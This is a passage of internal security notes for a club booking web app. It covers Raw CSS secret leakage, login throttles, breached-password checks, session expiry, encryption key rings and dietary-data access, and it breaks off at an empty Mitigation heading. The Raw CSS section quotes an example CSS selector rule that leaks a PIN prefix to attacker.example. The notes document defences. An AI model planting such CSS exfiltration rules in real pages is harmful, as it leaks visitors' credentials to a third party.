# Security Notes

This document captures security decisions and trade-offs that are too
implementation-specific for `SECURITY.md` at the repository root. The
root `SECURITY.md` covers the public reporting policy; this file
captures internal mitigations and operator-facing rationale.

## Secret entry on pages that carry Raw CSS

Audience: Developer, Agent.

### The rule

**A user-entered secret on a surface that injects administrator Raw CSS must
never be represented in a CSS-selectable DOM attribute, or in any other
selector-readable DOM metadata, while the secret is live.** The element's `value`
*property* may hold what the browser needs in order to submit; a stylesheet
selector must not be able to recover it.

Use `SecretInput` (`src/components/ui/secret-input.tsx`) for such a field. Do not
solve it by filtering CSS selectors, and do not move the secret to `data-*`,
`aria-*`, a hidden field or `title` — those are selectable too.

### Context

`buildClubThemeCss()` is the only build that appends the club's `rawCss` from
Admin > Site Appearance, and its output reaches a page document in **three**
places, enumerated in
[`SECURITY-ATTACK-SURFACE.md`](SECURITY-ATTACK-SURFACE.md) → "Admin Raw CSS on
the public site": the website chrome (the `(website)` and `(website-dynamic)`
groups), the lodge display screen, and the pre-setup holding screen. Every other
shell injects `buildClubThemeAppCss()`, which excludes it by design. That bullet
is the count; do not restate it here or anywhere else.

A styling administrator is deliberately **outside** the trust boundary of a kiosk
PIN or a bearer token — the same boundary #2827 drew for the group-join payment
token.

React's controlled-input pattern breaks that boundary. On every update
`react-dom` writes `node.defaultValue`, and `defaultValue` reflects to the `value`
**content attribute** — so a controlled input publishes what the visitor has typed
to any selector on the page:

```css
input#hut-leader-pin[value^="14"] { background: url(https://attacker.example/14); }
```

Measured in real browsers before any fix was written, because jsdom is not
evidence about a browser. The per-engine matrix is in the attack-surface bullet
above; the full method and the raw observations are on issue #2981.

### Mitigation

`SecretInput` renders an **uncontrolled** input: neither `value` nor
`defaultValue` reaches the element, so `react-dom` never writes `defaultValue`
and no `value` attribute exists at any point. Both props are removed by the type,
so passing one is a compile error rather than a lint rule, and stripped at
runtime so an untyped spread cannot reinstate the leak. Input filtering runs
against the element's own property instead of being fed back as a prop.

### The kiosk PIN is masked, with a show toggle (#3460)

Owner decision, 14 Sep 2026. The hut-leader kiosk PIN field is
`type="password"` by default, so the digits are dots on screen: that removes
shoulder-surfing and leaves no glyph of the PIN's digits for an administrator's
`@font-face` ligature technique to measure (the mask dots reveal only the fixed
length). A **Show PIN** button (its label flips to **Hide PIN**, keyboard
operable, keeps focus in the field on a click, and `type="button"` so it never
submits) flips the same element to `type="text"`. Rendered glyphs therefore exist **only while the PIN is shown**,
which is the cost the owner accepted for letting a hut leader check a mistyped
digit. The #2981 rule holds in both states: the element still carries no `value`
attribute. The behaviour belongs to `SecretInput` (`revealable`), so any future
secret field gets it from the one primitive.

### What keeps it true

- `e2e/raw-css-secret-reflection.spec.ts` — the runtime pin. It saves real Raw
  CSS containing the oracle rules, types a known PIN into the real page, and
  fails if the attribute, a prefix selector or the computed style ever reveals a
  character, and asserts the field is `password` by default and `text` only
  while shown. This half cannot be replaced by a source scan.
- `src/lib/__tests__/raw-css-secret-input-census.test.ts` — the static half:
  which files inject the theme CSS (so a fourth sink cannot appear
  unclassified), which credential fields exist on those surfaces, and that
  `SecretInput` still passes no value into the DOM. Its own docblock names the
  four evasion shapes it cannot see.
- `src/components/ui/__tests__/secret-input.test.tsx` — filtering, caret
  repair and the show/hide toggle.

### Scope, and what is accepted

Bounded to credential-bearing fields — PIN/passcode, passwords, bearer/invite/
access tokens, API keys — on the Raw-CSS surfaces. Ordinary text fields (a name,
an email) are not in scope: they are not secrets the styling administrator sits
outside the boundary for, and the attendee-data residual the attack-surface
bullet records is the owner's ratified position on those.

A stylesheet can still observe these, and all of them are **accepted**. None is
character-wise, and for a fixed-length all-digit PIN none of them narrows the
search space at all:

- `:placeholder-shown` — whether the field is empty.
- `:valid` / `:invalid` — whether the value satisfies the field's `pattern`,
  i.e. whether six digits have been entered.
- the submit button's `disabled` attribute, which flips at the same moment and is
  therefore redundant with `:valid`.
- `:autofill` — whether a password manager filled it.
- `:focus` / `:focus-visible` — whether the visitor is in the field.
- `:user-invalid` — the same bit as `:invalid`, after interaction.

**Stated limit, not a residual: real password-manager autofill was not measured.**
The browser spec covers programmatic paste and keyboard entry. HTML autofill sets
the `value` property rather than the attribute, which is the same seam typing
uses, so it is reasoned rather than observed.

## Personal-data retention and Sentry Replay

Audience: Operator, Developer, Adopter.

The [personal-data retention schedule](PRIVACY_RETENTION.md) covers every
Prisma model that holds personal data, including indirect member links and
settings' officer attribution. The three new cleanup jobs ship OFF; review the
candidates and configured periods before enabling them in Admin → Privacy
retention (`/admin/privacy-retention`).

Sentry Replay is an explicit club opt-in and defaults OFF. Before enabling it,
the club's privacy notice must **name Sentry Replay** and explain the recording
and its purpose, including what information can leave the application for
Sentry and the applicable retention. Review the Sentry project's retention and
access settings as part of that disclosure. Ordinary error reporting and
session replay are separate decisions; enabling error reporting does not
constitute the club's Replay opt-in.

Open tabs recheck the Replay setting every minute and when they regain focus
or become visible. Saving retention settings refreshes the current tab
immediately on the process handling that save. Other processes may retain the
previous policy for up to 60 seconds; combined with minute polling, an open tab
can take up to two minutes to observe a change while visible. The public policy
endpoint is rate limited and caches only the non-personal opt-in in process.
A failed policy read stops recording once the cached policy expires; background browser timer
throttling can delay the periodic refresh until the tab becomes visible.

## Per-account password throttle (#4609)

Audience: Operator, Developer.

The per-address limiter (10 attempts per 15 minutes per internet address)
cannot see one account guessed from many addresses — a botnet, a phone
network, a cloud provider. A second count, kept per account, closes that gap.
The rules are `INV-AUTH-001` to `INV-AUTH-004` in
[`invariants/authentication.md`](invariants/authentication.md); this section
holds the threat, the behaviour and the limits.

**What a member sees.** Five unsuccessful password attempts on one account,
from any addresses, start a wait: 30 seconds, doubling after each further
attempt to 15 minutes. An hour with no attempt forgets the count. During the
wait the sign-in page says "Too many sign-in attempts for this account. Please
wait a few minutes and try again", adding "or use another way to sign in below"
when the club has emailed sign-in links or Google switched on. A correct
password after the wait signs in as before and clears the count; so does a
completed password reset.

**Changing a password (#4640).** The authenticated change-password route shares
this budget, keyed on the member's stored email. Wrong current passwords count
alongside sign-in guesses. While waiting, it returns HTTP 429 with
`LOGIN_THROTTLED` and a generic wait message, without comparing the password or
changing it. A valid current password after the wait clears the shared count,
including when the member must change their password. Session and input checks
run first; this route accepts no account identifier to guess against.

**Enumeration parity at sign-in.** The throttle answers before any member record is read,
and its answer — `LOGIN_THROTTLED`, one message — is the same for a real, an
unknown, an inactive and a deleted account, after the same dummy bcrypt
compare. Unknown emails are counted exactly as real ones, so a throttled real
account and a throttled unknown email look the same. One thing does differ: a
valid sign-in or completed reset on a real account clears its count, which an
unknown email's count never is (see the stated limits).

**Password comparison cost (#4639).** Refused sign-ins use the precomputed
`DUMMY_PASSWORD_HASH` in `src/lib/password-hashing.ts`. Every account-password
writer, including lodge accounts, placeholders and seeds, imports
`PASSWORD_BCRYPT_COST` from that module. A regression test compares the dummy
hash's encoded cost with a newly generated password hash; changing the cost
requires regenerating the dummy hash too. Existing stored passwords keep their
original cost until replaced, so their comparison time can differ from the
dummy comparison. In particular, existing cost-12 seed and lodge accounts now
compare faster than unknown accounts. Hut-leader PINs use their separate policy.

**What is stored.** `LoginThrottle` holds an HMAC-SHA256 of the lower-cased
email under `AUTH_SECRET` (domain label `login-throttle:v1:`), a count and the
time of the last counted attempt. No address is stored or logged. Rows are
deleted on a valid password or a completed reset; a row idle for an hour is
deleted by the daily `data-pruning` job, or sooner by a ten-minute sweep in a
process that is handling password sign-ins
([retention schedule](PRIVACY_RETENTION.md)).
**Rotating `AUTH_SECRET` changes every key, which resets every count.**

**Under load on one account.** A claim waits at most one second for the
account's row; a claim that cannot have it answers with the same wait message,
uncounted. An account already waiting is refused from a plain read, without
queuing for the row, so a burst of guesses on one account cannot hold the
connection pool.

**If the store fails.** The claim falls back to a bounded per-process count at
the #1142 divided budget (one free attempt, then the same doubling wait), logs
at most once a minute naming no address or key, and never refuses a sign-in
because of the failure itself.

**Stated limits.**

- **An attacker can keep re-triggering the wait.** Refused attempts cost the
  attacker nothing on the account's count, and the per-address limiter does not
  stop many addresses. Someone who knows an officer's email can send a guess
  each time the 15-minute wait ends and keep password sign-in waiting, and a
  password reset buys back only five attempts. The officer still has any other
  way in the club has switched on — emailed sign-in links (off by default) or
  Google. The owner accepted this on #4609; an exemption for known devices
  would need a new plan on #4454.
- **During a blue/green cutover the old slot has no per-account throttle.** The
  migration is expand-only and the draining release never names the table, so
  guesses routed to the old slot are counted only by the per-address limiter.
  Protection is complete once the old slot drains.
- **A recent valid sign-in shows as a reset count.** A valid password or a
  completed reset clears the count (the issue's rule, and the owner's decision
  for resets), and an unknown email's count is never cleared. So someone who
  sends four wrong guesses and, within the hour, two more can tell from whether
  the last one waits that a real account's owner signed in or reset in between
  — proving the account exists and roughly when it was used. A throttled real
  account and a throttled unknown email still look the same.
- **In-memory fallback counts per process.** While the store is down — or the
  connection pool is too busy to give a claim a connection within a second —
  each replica counts on its own, at the divided budget, without reading the
  stored count; a restart forgets them.
- Password sign-in and authenticated current-password checks only: emailed sign-in links, Google, two-factor code entry
  (its own lockout) and lodge PIN sign-in are separate, and forgot-password and
  sign-in-link requests have their own per-account limits
  ([below](#per-account-email-request-limits-4613)).

## Per-account email request limits (#4613)

Audience: Operator, Developer.

"Forgot password" and "email me a sign-in link" are each limited to 5 requests
an hour from one internet address. That cannot see one account requested from
many addresses, which could fill a member's inbox with emails they did not ask
for, paid for from the club's sending quota and reputation. A second count, per
account, closes that gap. The rule is `INV-AUTH-005` in
[`invariants/authentication.md`](invariants/authentication.md#inv-auth-005).

**What a member sees.** Each route sends at most **3 emails an hour to one
account**, however many addresses ask; the two routes count separately. The
fourth request in the hour gets the usual "check your email" answer and no
email. The window is fixed, not sliding: the count resets an hour after that
account's first counted request.

**Enumeration parity.** The limit is decided from the account key alone, before
any member record is read (and, for sign-in links, before the module setting is
read). A limited request answers HTTP 200 `{ success: true }`, byte for byte the
answer to an accepted request, a real account and an unknown email alike.
Unknown emails are counted exactly as real ones.

**What is stored.** The count lives in the shared `RateLimitCounter` table
under `forgot-password-account:account:` or `magic-link-request-account:account:`
followed by the account key the password throttle uses: an HMAC-SHA256 of the
lower-cased email under `AUTH_SECRET` (`INV-AUTH-001`). No address is stored or
logged, and rows go with the ordinary rate-limit cleanup
([retention schedule](PRIVACY_RETENTION.md)). Without an auth secret the count
stays in the process.

**If the store fails.** The count falls back to the #1142 per-process budget,
3 divided by 4 and rounded down to a floor of 1: one email per account per hour
on each replica. The routes still answer; a store failure never blocks a request.

**Stated limits.**

- **Anyone can use up a member's hourly allowance.** A sender who knows a
  member's email can request three emails each hour, after which the member's
  own request that hour sends nothing. The member still has the emails already
  sent, and the next hour's allowance. This trades a delay for the member
  against an unbounded stream to their inbox.
- **A limited request skips the database read**, so it can answer slightly
  faster than an accepted one. That timing shows only that the limit was
  reached, never whether the account exists.
- **In-memory fallback counts per process.** While the store is down, each
  replica counts on its own and a restart forgets the count.
- **During a blue/green cutover the old slot has no per-account limit.** The
  draining release never calls it, so requests routed to the old slot are
  counted only by the per-address limiter. Protection is complete once the old
  slot drains.

## Breached-password check (#4610)

Audience: Operator, Developer.

A password reused from a breached site passes any length or character rule,
and it is the first thing an attacker tries. So when a person chooses a
password, the app asks a public breached-password service whether it has been
seen in a breach, and refuses it if so. The rules are `INV-AUTH-006` in
[`invariants/authentication.md`](invariants/authentication.md#inv-auth-006); this section
holds the behaviour and the limits.

**Where it runs.** Changing a password, choosing one from a reset or
account-setup link, an officer setting a kiosk password (Lodge settings), and
the install-time seed's `SEED_ADMIN_PASSWORD` and `SEED_LODGE_PASSWORD`, each
checked only when its account is missing, and both before the seed writes
anything. The seed runs before the club setting exists, so it always checks,
and a breached password stops it, with nothing written, and a message naming
the variable.
Self-registration is retired (`/api/auth/register` answers 410), and the
other ways an account is created (admin creation, imports, approved
applications, placeholder contacts) store a random placeholder, so the
person's first real password is chosen through the reset or setup link and
screened there. A refused password answers HTTP 400
with code `PASSWORD_BREACHED` and a plain message asking for another; a reset
or setup link stays usable, so the person can try again. Sign-in never runs
the check, and passwords already set are not re-checked.

**What leaves the server.** The app makes the password's SHA-1 hash and sends
only its first five hex characters to
`https://api.pwnedpasswords.com/range/<prefix>` (the k-anonymity "range"
method), with the `Add-Padding` header so every answer is a similar size. The
service returns every listed hash suffix sharing that prefix, and the match is
made on the server. No password, full hash, email or member id is sent, and no
log line carries the prefix. Sentry instruments outgoing fetches, so the server
init configures its Node fetch integration to ignore the range request
(`ignoreOutgoingRequests`): it gets no span, no breadcrumb, and no
`sentry-trace` or `baggage` header sent to the service. As a backstop, the
shared privacy options every `Sentry.init` spreads
(`src/lib/sentry-privacy-options.ts`, keyed on the endpoint constant) drop any
span naming the range URL, scrub the prefix from any span that still reaches
`beforeSendSpan`, drop the fetch breadcrumb, and scrub it from every error
event. Deployments that restrict outbound traffic must
allow HTTPS to `api.pwnedpasswords.com`
([`CONFIGURATION.md`](../CONFIGURATION.md#outbound-network-access)).

**Club setting.** On by default. A Support & System editor can switch it off
under **Admin → Login & Security → Password policy** ("Refuse passwords found
in public data breaches"); it is saved and audited with the rest of the card
and travels in a configuration export. Switched off, no request is made.

**If the service is slow or down.** It fails open: with no answer within three
seconds, a network error, a non-200 or a malformed answer, the password is
accepted and a warning naming only the failure class is logged. An outage
elsewhere never stops a member setting a password or finishing setup.

**Every place a password is written is counted.**
`src/lib/__tests__/password-hash-writer-census.test.ts` parses every
`passwordHash` writer under `src/`, `prisma/` and `scripts/`: property writes,
and raw-SQL `INSERT` or `UPDATE` literals naming the column. A writer must
either be guarded — a `const` bound to the awaited `screenChosenPassword`
result, then an `if (!result.ok)` that returns, both in a block enclosing the
write and before it, where the screened argument and the written hash's
`bcrypt.hash` input resolve to the same unreassigned `const` or parameter, and
the call does not switch the check off — or be listed as exempt with its reason (placeholders, imports,
erasure, the local demo seed and SQL fixtures store generated or unusable
hashes). For an exempt writer the census also traces the value it writes,
through `const` bindings and the `bcrypt.hash` input, and requires random
bytes, the erased-account sentinel or a fixed literal (for raw SQL, the value
written inline: no template holes, bind placeholders or bind arguments), so an
exemption cannot come to cover a typed password. A writer that stores a
parameter, or copies the `passwordHash` of an object built in the same
function, names the writer that produced the value (`valueFrom`), which must
be screened or traced to a generated value; a copy counts only when its object
was built by a generated or screened writer and nothing changes that object
afterwards (a write, an alias that writes, or any call that receives it or one
of its elements; a read-only array method that calls back with the elements is
exempt only when given an inline function that does not read `arguments`,
whose element and array parameters are followed as aliases; a named one is a
hand-over). A screen likewise stops counting
when, after it, an alias or a call changes the screened object. Only the local
demo seed is listed as untraced. A new
writer in neither list fails the build. It cannot see SQL assembled by
concatenating separate literals or read from a `.sql` file at run time.

**Stated limits.**

- **Fail-open means an outage lets a breached password through.** That was
  chosen over blocking members (#4610); the warning in the log is how an
  operator sees it happening.
- **The prefix narrows the password to one of several hundred listed hashes.**
  That is the method's design: the service learns a bucket, not the password,
  and nothing ties the request to a member beyond the server's own address.
- **During a blue/green cutover the old slot does not check.** The migration
  only adds the setting column, and the draining release never reads it.
- **The install-time seed fails open too.** If the seed host cannot reach
  the service, `SEED_ADMIN_PASSWORD` and `SEED_LODGE_PASSWORD` are accepted
  unchecked, as any chosen password would be. The seed admin must still change
  password on first sign-in, which is screened; nothing forces the seed
  kiosk's password to change.
- **The local demo seed is not screened.** `pnpm run db:seed:demo` hashes
  `DEMO_SEED_PASSWORD` (or its published default) for local demo accounts; it
  refuses to run without `ALLOW_DEMO_SEED=1` and never seeds a production
  account.

## Session idle expiry and the lodge kiosk (#4612)

Audience: Operator, Developer.

A signed-in session ends after **8 hours without use**. The lodge kiosk account,
signed in on the shared lodge tablet, is the one exception: **30 days without
use**, so the tablet is not signed out after a quiet night (owner decision,
2 Nov 2026). "Use" is any refresh of the session; the kiosk page refreshes it
when it loads and when it regains focus, and each refresh starts a full window
again.

**Which account is the kiosk.** The app's own record class,
`isLodgeKioskAccount` in `src/lib/member-roles.ts`: `LODGE` is the record's
whole classification, the User Type the member page shows as "Lodge (kiosk
account)". Holding `LODGE` is not enough. It is a checkbox any officer can
also have, so a Full Admin, a Booking Officer or a custom-role holder who also
holds `LODGE` is an ordinary account and keeps 8 hours. A record holding only
`USER` and `LODGE` classifies as the kiosk (`member-roles.test.ts` pins this)
and so gets 30 days: to keep a person who uses the lodge tools on 8 hours,
give them a second role or untick Lodge. The `jwt` callback
stamps a `kioskAccount` claim from the member row on every refresh. That claim
only nominates a session for 30 days: before granting them, the refresh reads
the member row again and confirms it is still the kiosk and still holds this
session.

**Where it is decided.** `src/lib/session-idle-expiry.ts` holds both windows
and the rule. Auth.js stamps the token's `exp` and the cookie's `Expires` from
one number, `session.maxAge`, each time it writes the cookie, and offers no
per-token hook. So `buildRequestAuthConfig` in `src/lib/auth.ts` sets
`session.maxAge` per request from the session cookie the request carries; the
token and the cookie therefore always agree. The earlier per-token `exp` line
in the `jwt` callback was overwritten by that re-encode and did nothing; it is
gone. `auth-session-idle-expiry.test.ts` proves both windows end to end through
the real Auth.js handler on the frozen clock.

**Accepted limits.** Every decision on doubt fails towards the shorter window.

- A sign-in starts with 8 hours; the kiosk page's first refresh, straight after
  it loads, re-issues 30 days.
- Only the session endpoint (`/api/auth/session`) reads the incoming token.
  Signing in as another member on the kiosk tablet, while the kiosk cookie is
  still there, gives that member the ordinary 8 hours.
- The window is chosen before the `jwt` callback re-reads the member row, so
  a session whose incoming `kioskAccount` claim is `true` has its row read
  first, with the callback's own loader (`loadSessionMemberSecurity`), kiosk
  test (`isKioskSessionMember`) and revocation rules (`isRevokedMemberSession`
  in `src/lib/session-member-security.ts`). It gets 30 days only if the row is
  still the kiosk and the session is not revoked; a missing row, any other row
  or a failed read gives 8 hours. So when the kiosk stops being the kiosk (its
  `LODGE` role removed, or a second role added) or its login is switched off,
  the very next refresh re-issues 8 hours. This costs one query, on kiosk
  refreshes only.
- Turning an account into the kiosk takes one refresh longer: its incoming
  claim is still `false`, so that refresh re-issues 8 hours and stamps the
  claim for the next.
- A cookie already issued keeps its expiry until a refresh re-issues it; the
  kiosk page refreshes on load and on focus. A role change that lands between
  the window's row read and the callback's, inside one request, is seen on the
  next refresh. Neither widens what the session may do: what the account may
  do is read afresh from the database on every request, as for any account,
  and switching its login off ends the session outright.
- A token issued before the `kioskAccount` claim existed carries none, so it
  gets 8 hours; its first refresh stamps the claim.
- The hut-leader PIN session on the same tablet is separate: 10 minutes idle,
  12 hours in total (`lodge-pin-session-timing.ts`).
- This is the idle window only. The ceiling on a session's total age, measured
  from sign-in, is the next section.

## Maximum session age (#4611)

Audience: Operator, Developer.

The idle window above ends a session nobody uses, but every refresh slides it
forward, so a browser in daily use, or a stolen session cookie replayed every
few hours, would otherwise stay signed in for ever. So every session also ends
a fixed time **after sign-in**, however active it is. The rules are
`INV-AUTH-007` in
[`invariants/authentication.md`](invariants/authentication.md#inv-auth-007);
this section holds the behaviour and the limits.

**The limit.** A club setting, **7 days** by default, any whole number of hours
from 8 to 720 (30 days). A Support & System editor sets it under **Admin →
Login & Security → Password policy** ("Sign members out after (hours)"); it is
saved and audited with the rest of the card, travels in a configuration export,
and a value outside the range is refused on save. The lodge kiosk account (the
classification in the section above) keeps its own **30 days**, which the club
setting never shortens or lengthens.

**How it is measured.** Signing in stamps the token's `sessionIssuedAt` once.
Every later refresh re-runs the `jwt` callback in `src/lib/auth.ts` without
re-stamping it, so neither activity, a role change, a two-factor verification
nor a refresh moves it. The JWT's own `iat` is renewed on every refresh and is
never used. On each refresh the callback asks `isSessionPastMaxAge`
(`src/lib/session-max-age.ts`) whether the incoming stamp is at least the limit
old; if so it sets `sessionInvalidated`, the same flag a revoked session
carries, and `auth()` answers no session. The setting is read on every
refresh, so a change applies to people already signed in on their next
request.

**What the person sees.** The same as any ended session: the next page load
goes to sign-in with the page as the return path, and an API call answers 401.
Signing in again starts a new clock.

**A token without a readable stamp is expired.** Every token minted since
`sessionIssuedAt` was introduced carries one, so in practice this ends only
tokens from before it, or ones not minted by the app.

**Stated limits.**

- **Upgrading ends every session already older than the limit**, on its next
  request: with the default, anyone who signed in more than 7 days before the
  release signs in again, and the lodge kiosk tablet does if it was signed in
  more than 30 days before. Plan the release accordingly.
- **The kiosk tablet must be signed in again every 30 days**, even in daily use.
- **The decision is recomputed on every read, not stored on the server.** The
  session is a signed token with no server-side session store. The
  `sessionInvalidated` flag is saved into the cookie only when the browser
  refreshes its session through `/api/auth/session`; a bare `auth()` (a page
  render, a route handler) never writes the cookie, so a past-limit cookie
  replayed without reaching that endpoint is judged afresh from its sign-in
  stamp each time. It is refused while the limit stands, but raising the
  setting, or the account becoming the kiosk, re-admits a session past the
  old limit that was never saved as invalidated. No server-side state is
  kept to prevent that.
- **The cookie is not destroyed at the limit.** While a tab keeps fetching
  `/api/auth/session` it is re-issued, still refused; otherwise it lapses
  after the idle window.
- **A failed settings read fails the refresh closed.** The session endpoint
  clears the cookie, as for a failed member read, and a bare `auth()` reads no
  session; it never extends a session.
- **During a blue/green cutover the old slot does not apply the cap.** The
  migration only adds the setting column, and the draining release never reads
  it; the first request the new slot serves applies it.

**Rotating the kiosk password ends its sessions (#4742).** `PUT
/api/admin/lodge` stamps `passwordChangedAt` with the new password hash, as the
member change- and reset-password routes do, so `isRevokedMemberSession` ends
every kiosk session issued before the rotation at its next refresh, whatever
window it holds. `admin-lodge-route.test.ts` feeds the written row to that rule.

## Data-encryption key ring (#4456)

Audience: Operator, Developer.

**The threat.** `AUTH_SECRET` signs every session. Before #4456 it was also the
root of every key protecting data at rest — the integration credentials (Xero,
Stripe, Google, backup, AI and Alpine Central Server keys, the Xero token set),
members' authenticator-app secrets and the two-factor code hashes. One leaked
value therefore let someone forge an admin session **and** decrypt every
stored credential from a backup, and the secret could not be rotated after a
leak without destroying all of that data.

**The design.** `DATA_ENCRYPTION_KEYS` holds a ring of 32-byte keys, one module
(`src/lib/data-encryption-keys.ts`) is the only source of them, and sessions
keep `AUTH_SECRET`. The operator view is in
[`CONFIGURATION.md`](../CONFIGURATION.md#data-encryption-keys-4456); the rules
the code holds to are:

- **A write uses the current (first) key**, recorded on the row: a
  credential's `secretSource` becomes `DATA_ENCRYPTION_KEY:<id>` (label
  `integration-credential:v2`), an authenticator secret is `v2:<id>:…`, a code
  hash is `<id>:<hex>`. No schema change; nothing old is rewritten.
- **A read uses the key its row names and no other.** Keys are never tried in
  turn, so there is one deterministic answer, and a row naming a key the
  deployment no longer holds is the existing "needs re-entry" state, not a
  guess or a crash.
- **Each use has its own HKDF-SHA256 sub-key** of a ring key (credentials,
  authenticator secrets, code hashes), so no two uses share key material.
- **With no ring set, nothing stored changes**: the auth secret is the current
  key and every format is byte-for-byte what it was. That is what makes the
  release safe to deploy blue/green. Only the setup step differs: red while a
  credential or an authenticator secret is stored under the auth secret alone,
  so `setup:check` exits 1 until a key is set.
- **A bad ring fails closed.** Any malformed, short, single-byte, duplicate-id
  or duplicate entry makes the whole ring invalid, and so does a key that is
  the auth secret (its text, or its bytes as base64, hex or UTF-8) or one whose
  bytes are all printable ASCII (a password). Readiness (`/api/health/ready`)
  fails, capture refuses, ring rows report "cannot be read", rows still on the
  auth secret stay readable, and setup readiness goes red naming the entry —
  never its value.
- **No write falls back to the auth secret over ring data.** While no ring is
  set but a credential, authenticator secret or recovery code names a ring key,
  credential capture, the Xero refresh, two-factor enrolment and recovery-code
  replacement refuse (`data-encryption-legacy-write-guard.ts`), so a lost ring
  never quietly puts new secrets back under the auth secret. The setup step's
  "ring missing" verdict reads the same predicate. Email codes and sign-in
  challenges live minutes and leave nothing behind, so they are still issued.
- **No key material is logged.** Errors and readiness name an id or a position
  only, a key object prints as its id, and a spread copy of it carries no
  material.

**Recovery codes at cut-over.** A keyed hash cannot be re-keyed, so recovery
codes issued under the auth secret stop working the moment a ring is set. The
owner chose this over keeping the auth secret in the ring for them (decision
of 1 Nov 2026 on #4456): it lets the auth secret leave the data path entirely.
A member still holding such codes is told on the sign-in challenge and on their
profile to generate a new set. Under the ring they are only refused, so an
instance started without it would accept them;
`pnpm run data-keys:reencrypt --retire-legacy-recovery-codes` rewrites each one
so that no release accepts it, and keeps it unused so the notice still shows
([`TOKEN_HASHING.md`](TOKEN_HASHING.md#keyed-code-hashes-and-the-data-encryption-key-ring-4456)).

**Moving rows off the auth secret.** `pnpm run data-keys:reencrypt` re-encrypts
every credential and authenticator secret not under the ring's current key,
one row per short transaction, through the writers that already own each row:
the credential store's compare-and-set (audited as the named
`data-key-reencrypt` job, `INV-PRIV-020`), and a claim on the exact stored
value for an authenticator secret (audited as
`security.two_factor.secret_rewrapped`). A concurrent writer wins and the row is
retried. The Xero token set is moved only while no refresh holds its lease, so
a refresh that has spent its token at Xero always saves the new one
([`CONCURRENCY_AND_LOCKING.md`](CONCURRENCY_AND_LOCKING.md#the-data-key-re-encrypt-joins-the-row-claims-and-takes-no-advisory-key-4456)).
It prints counts and key ids only: an unexpected error is reported by its class
and code, because a database error's message can echo the row it failed on.

**Retiring the legacy key.** Until `DATA_ENCRYPTION_LEGACY_KEY=retired` is set,
a row naming the auth secret is still READ under it, so someone holding a leaked
auth secret and write access to the database could plant a credential or an
authenticator secret the app would accept. Once the re-encrypt reports nothing
left, the switch refuses those reads: the auth secret then signs sessions and
links and nothing else. It is a read switch only; the ring already decides every
write. Set without a ring, or to any other value, it fails readiness and refuses
writes rather than letting the auth secret back in
([`DEPLOYMENT.md` → Retiring the legacy key](../DEPLOYMENT.md#retiring-the-legacy-key-4456)).

**Stated limits.**

- Rows written before the ring stay readable under `AUTH_SECRET` until the
  re-encrypt moves them and the legacy-read switch is set; until then the
  current auth secret reads them. Both are operator steps, so a club that sets
  a ring and stops there keeps that coupling for its old rows.
- The re-encrypt retries a row that lost its claim a bounded number of times
  (three passes, two seconds apart), then reports it and exits 2; running it
  again moves it.
- An older release cannot read ring rows, so the variable must not be set until
  the previous release has drained (the runbook's first step).
- The keys live in the environment of each app container, like `AUTH_SECRET`;
  a host compromise exposes them. A cloud KMS was rejected as the default
  because clubs self-host on one server; the ring leaves room for one later.
- Authenticator secrets carry no row binding (no GCM associated data), as
  before; credentials keep theirs (`provider:key:label`).

## Dietary/allergy information (special-category data)

Audience: Developer, Agent, Operator.

`Member.dietaryRequirements` (#2941) and each stay's
`BookingGuest.dietaryRequirements` (#3029) hold health-related personal
information, children's included. The rule is `INV-PRIV-022` in
[`invariants/analytics-and-privacy.md`](invariants/analytics-and-privacy.md#inv-priv-022);
this section records how it is enforced.

- **Absent by default, not filtered.** Every application Prisma client omits the
  column (`src/lib/prisma-global-omit.ts`), so a Member read that does not ask
  for it does not carry it — including nested includes and the row an update
  returns. `src/lib/member-dietary.ts` is the only module that asks, and only for
  a caller holding a grant: the member themself (the grant takes their session),
  their own data export, an admin whose OWN database row and access roles reach
  **membership** (the grant re-reads them and ignores any session matrix), or a
  merge whose Full Admin the grant re-checks in the database, scoped to the two
  members being merged. A booking value is read by an admin whose own rows reach
  **bookings** (view; edit to change one row through
  `PATCH /api/admin/bookings/[id]/guest-dietary`), by the kiosk's `admin` and
  `hut-leader` tiers for that day's present guests only, and by the subject's
  own export for their own guest rows. A booking grant cannot read a profile,
  nor a profile grant a booking. A grant is an opaque object whose authority
  lives in a module-private map, so a copy of one is not a grant.
- **The booking write side hands out tokens, not values — and its real fence is
  its importer list.** Its half of the boundary,
  `src/lib/member-dietary-booking-writes.ts`, is the only other file that may
  name the column; it mints no grant, and its carries are scoped to their
  source booking. Its two fragment builders necessarily return the plain value
  for Prisma to write, so what holds is the census: a closed list of booking
  writers may import it, none may name a grant or reader, the builders may
  appear only as a `...` spread operand, nothing imported from it may be
  renamed, and seeding may only come from the toggle. Its carries are scoped to
  their source booking, which stops an accidental cross-booking capture, not a
  deliberate one. That is a text scan and holds no stronger than one; the
  importer list plus review is the fence. Every guest create
  site takes a required dietary decision from it, and the held-party
  planners carry a value only by unique identity, never by position
  (`INV-MOD-059`); a writer never holds the value in readable form.
- **The type does not say so.** `src/lib/prisma.ts` keeps the plain
  `PrismaClient` type, so the compiler still shows the field on every row; a read
  outside the module gets `undefined`, never the value.
  `member-dietary-access-census.test.ts` is a TEXT scan of `src/`, `scripts/`,
  `prisma/` and `e2e/`. It fails on any other select, local omit override,
  raw-SQL read of the column, whole-row raw read or omit-less client; it confines
  the field's spelling (in `src/`), imports of the module, and calls of the merge
  engine (which mints a scoped grant internally) to listed files, none on an
  egress path (a booking-value entry may be allowed, by name, onto the booking
  or kiosk family only), and refuses a re-export, exported alias or minting
  wrapper of a grant or reader, a booking writer that names a grant or reader,
  and any writer but the module naming the column. It does
  NOT trace data flow: a listed file reading the field off an ordinary row, or
  passing a value it legitimately holds onward, stays green. Review covers that.
- **Redaction as a backstop.** The log/Sentry redactor strips `dietary`/`allerg`
  keys, and the audit sanitizer redacts any string or structure under such a key
  while keeping the booleans that record which field changed.
- **The AI diagnostics role cannot read it.** Its Member and BookingGuest
  grants are column allowlists (`provision-role.ts`) that include neither
  column.
- **Backups contain it**, like every other column; see
  [`guides/backups.md`](guides/backups.md).

## Token-bearing URL paths

### Context

Some emailed confirmation and payment links carry 256-bit tokens in URL paths:

```
https://<host>/membership-cancellation/<token>
https://<host>/chores/<token>
https://<host>/nominations/<token>
https://<host>/pay/<token>
https://<host>/booking-requests/verify/<token>
```

URL paths are routinely captured by:

- Next.js / Node access logs
- Reverse-proxy logs (Caddy, in our deployment topology)
- Sentry and any other observability tooling that captures request
  metadata
- Browser history
- The `Referer` header of any outbound link click from the confirmation
  page

### Residual risk

Some token routes are also session-bound; others are intentionally public
opaque-token flows. A stolen public payment, chore, nomination, or booking
request verification token can act as the bearer credential for that specific
workflow until it is used, revoked, or expires.

### Mitigation

